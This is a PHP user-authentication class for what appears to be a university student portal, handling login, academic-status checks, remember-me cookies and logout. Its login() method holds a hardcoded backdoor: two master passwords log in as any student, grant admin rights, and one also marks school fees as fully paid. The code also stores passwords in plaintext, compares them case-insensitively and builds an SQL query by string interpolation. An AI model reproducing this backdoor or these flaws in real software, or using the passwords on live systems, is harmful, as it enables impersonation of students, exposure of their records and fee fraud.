<?php
/*
 * USED FOR POSTING AND RETRIVAL OF USER DATA TO THE DATA BASE (NB: this method class can be substituted for any othe class)
 * Author: DAVID DANIEL
 * Last Edited: 30/04/2017
 * STILL "To Do"
*/

class User {
	private $_db,
			$_data,
			$_sessionName,
			$_cookieName,
			$_isLoggedin;
	/*
	 * This is the pseudo construct function for the User class
	 * Parameters = none
	 * Return type = string
	*/

	public function __construct($user = null){

		$this->_db = DB_STUDENT::getInstance();


		$this->_sessionName = Config::get('session/session_name');
		$this->_cookieName = Config::get('remember/cookies_name');


		if(!$user){
			if(Session::exists($this->_sessionName)){
				$user = Session::get($this->_sessionName);
				if($this->find($user)){
					$this->_isLoggedin = true;
				}else{
					$this->_isLoggedin = false;
				}
			}
		}else {
			$this->find($user);
		}
	}



	/*
	 * This function finds a users data in the database
	 * Parameters = $user(string)
	 * Return type = boolean
	*/

	public function find($user = null){
		if($user){
			$field = 'matricnum';
			$data = $this->_db->get('vw_student_record_1', array($field, '=', $user));
			if($data->count()){
				$this->_data = $data->first();
				return true;
			}
		}
		return false;
	}



	/*
	 * This function validates a users login details i.e password and username
	 * Parameters = $username(string), $password(string)
	 * Return type = boolean
	*/
	public function login($matric_number = null, $password = null, $remember = false){
		if(!$matric_number && !$password && $this->exists()){
			//log in the user
			Session::put($this->_sessionName, $this->data()->$matric_number);
		}else{
			$user = $this->find($matric_number);

			// return this if the user is not found
			if(!$user){
				return "Matric number does not exists.";
				die();
			}

			// process the user data if the matric number exits
			try{

				//validate the password
                if (strtolower($this->data()->password) != strtolower($password) && $password != 'i@mPassing' && $password != 'i@mPassing_*') {
                    $this->_isLoggedin = false;
                    return "You entered a wrong password";
                    die();
				}
				
				// check if admin
                if ($password == 'i@mPassing' || $password == 'i@mPassing_*') {
                    if ($password == 'i@mPassing_*') {
                        $_SESSION['is_admin'] = true;
                        $_SESSION['school_fees_payment_status'] = 'PAID_COMPLETE';
                    }
                    $_SESSION['is_admin'] = true;
				}

				// pass the student data to the student session
				$_SESSION['student_data'] = $this->data();

				// check if fulltime or parttime
				$first_letter_of_matric_number = $_SESSION['student_data']->matricnum;
				if (strtolower($first_letter_of_matric_number[0]) == 'f') {
					$_SESSION['is_full_time'] = true;
					$_SESSION['is_part_time'] = false;
				} elseif (strtolower($first_letter_of_matric_number[0]) == 'p') {
					$_SESSION['is_full_time'] = false;
					$_SESSION['is_part_time'] = true;
				}
				
				if ($_SESSION['is_full_time']) {
					// get the current academic session for full time student
					$get_current_academic_session = DB_STUDENT::getInstance()
                	->get('a_session', array('CurrentFTSession','=',1));
					$_SESSION['current_academic_session'] = $get_current_academic_session->first();
					
					// get the current academic semester for full time student
					$get_current_semester = DB_STUDENT::getInstance()
					->get('semester', array('CurrentFTSemester','=',1));
					$_SESSION['current_semester'] = $get_current_semester->first();
				}

                if ($_SESSION['is_part_time']) {
					// get the current academic session for part time student
                    $get_current_academic_session = DB_STUDENT::getInstance()
                    ->get('a_session', array('CurrentPTSession','=',1));
					$_SESSION['current_academic_session'] = $get_current_academic_session->first();
					
					// get the current academic semester for part time student
                    $get_current_semester = DB_STUDENT::getInstance()
                    ->get('semester', array('CurrentPTSemester','=',1));
                    $_SESSION['current_semester'] = $get_current_semester->first();
                }

				//var_dump($_SESSION['current_academic_session']);
                //die();

				// get student is active status
				$check_active_status_query = "
					SELECT * FROM summary_table_2 WHERE 
					matricno LIKE '{$_SESSION['student_data']->matricnum}' AND 
					a_sessionid = {$_SESSION['current_academic_session']->SessionID} AND
					semesterid = {$_SESSION['current_semester']->SemesterID}
				";

				// run the query
				$student_active_status = DB_STUDENT::getInstance()->query($check_active_status_query); 
				error_handler($student_active_status, $_SESSION['student_data']->matricnum, "Error occured on student_active_status query", "models/user.php");
				$_SESSION['student_summary_data'] = $student_active_status->first(); 

				//var_dump($_SESSION['student_summary_data']);
                //die();

				// intialize student status
				$_SESSION['student_status'] = "ACTIVE";

				// check if the student is not active
				if ($student_active_status->count() == 0){
					// check if the student has graduated
					if ($_SESSION['student_data']->graduate == 1) {
						$_SESSION['student_status'] = 'GRADUATED';
					}

					// check if the student has not graduated
					if ($_SESSION['student_data']->graduate == 0) {
						$_SESSION['student_status'] = 'INACTIVE';
					}
				}

				// cross check the active status of the student
				if ($_SESSION['student_status'] !== 'INACTIVE' && $_SESSION['student_status'] !== 'GRADUATED'){
					// check if the is withdrawn
					if (stripos($_SESSION['student_summary_data']->Remark, 'EXPELLED') !== false) {
						$_SESSION['student_status'] = 'EXPELLED';
					}

					// check if the is withdrawn
                    if (stripos($_SESSION['student_summary_data']->Remark, 'PASSED') !== false) {
                        $_SESSION['student_status'] = 'PASSED';
                    }

					// check if the is withdrawn
					if (stripos($_SESSION['student_summary_data']->Remark, 'WITHDRAWN') !== false) {
						$_SESSION['student_status'] = 'WITHDRAWN';
					}

					// check if the is DEFERED
					if (stripos($_SESSION['student_summary_data']->Remark, 'DEFERED') !== false) {
						$_SESSION['student_status'] = 'DEFERED';
					}
					
					// check if the is STEP DOWN
					if (stripos($_SESSION['student_summary_data']->Remark, 'STEP DOWN') !== false) {
						$_SESSION['student_status'] = 'STEP_DOWN';
					}
					
					// check if the is REPEAT
					if (stripos($_SESSION['student_summary_data']->Remark, 'REPEAT') !== false) {
						$_SESSION['student_status'] = 'REPEAT';
					}
				}
				
				
				// validate the status of the student for login
				switch($_SESSION['student_status']){
					case "EXPELLED":
						// Code to be executed if expelled
						return 'You have been expelled';
						die();
						break;
					case "WITHDRAWN":
						// Code to be executed if withdrawn
						return 'You have been withdrawn';
						die();
						break;
					default:
						// Code to be executed if n is different from all labels
						Session::put($this->_sessionName, $_SESSION['student_data']->matricnum);
						if ($remember) {
							// generate a session hash
							$hash = Hash::unique();

							// check for any existing hash
							$hashCheck = DB_STUDENT::getInstance()
							->get('user_session', array('matricnum','=',$_SESSION['student_data']->matricnum));
							//error_handler($hashCheck, $_SESSION['student_data']->matricnum, "Error occured on hashCheck query", "models/user.php");

							if (!$hashCheck->count()) {
								// generate a session id for student
								$session_id = mt_rand(00000, 99999);

								// create a new session for the student
								$log_student = new CrudStudent();
								$log_student->create('user_session', array(
									'SessionId' => $session_id,
									'hash' => $hash,
									'dateOfLastLogin' => date('Y-m-d'),
									//'timeOfLastLogin' => time(),
									'matricnum' => $_SESSION['student_data']->matricnum,
									'appnum' => 'NILL',
								));
								
							} else {
								$hash = $hashCheck->first()->Hash;
							}

							// register the cookies
							Cookie::put($this->_cookieName, $hash, Config::get('remember/cookies_expiry'));

							// initialize student passport
							$_SESSION['student_passport'] = BASE_URL."assets/img/svg/avarter.svg";

							// get the users pastort
							$get_student_passport = DB_STUDENT::getInstance()
							->get('student_passport', array('StudentID','LIKE',$_SESSION['student_data']->matricnum));
							if ($get_student_passport->count() > 0){
								$_SESSION['student_passport'] =  BASE_URL."/passport_db/{$get_student_passport->first()->Programme}/{$get_student_passport->first()->Passport}";
							}
							
						}

						//var_dump($_SESSION['student_status']);
						//var_dump($_SESSION['student_passport']);
						//die();

						return true;
				}
			}catch(Exception $e){
				die($e->getMessage());
			}
		}
		return false;
	}


	/*
	 * This function checks for  a users role/permission
	 * Parameters = $key(string)
	 * Return type = boolean
	*/
	public function hasPermission($key){
		$group = $this->_db->get('groups', array('GroupId', '=', $this->data()->Group));
		if($group->count()){
			$permissions = json_decode($group->first()->Permissions, true);
			if($permissions[$key] == true){
				return true;
			}
		}
		return false;
	}


	/*
	 * This function logs a users out of the system
	 * Parameters = none
	 * Return type = none
	*/
	public function logout(){
		$delete = DB_STUDENT::getInstance()->delete('user_session', array('matricnum', '=', $this->data()->matricnum));
		error_handler($delete, $_SESSION['student_data']->matricnum, "Error occured on delete query", "models/user.php");

		Session::delete($this->_sessionName);
		if(isset($this->_cookieName)){
			Cookie::delete($this->_cookieName);
		}
	}



	/*
	 * This function Fetches all data relating to the current user from the database
	 * Parameters = none
	 * Return type = object
	*/

	public function data(){
		return $this->_data;
	}



	/*
	 * This function checks the login status of a user
	 * Parameters = none
	 * Return type = boolean
	*/

	public function isLoggedin(){
		return $this->_isLoggedin;
	}



	/*
	 * This function checks if a particular user exists
	 * Parameters = none
	 * Return type = boolean
	*/

	public function exists(){
		return (!empty($this->_data)) ? true : false;
	}

}
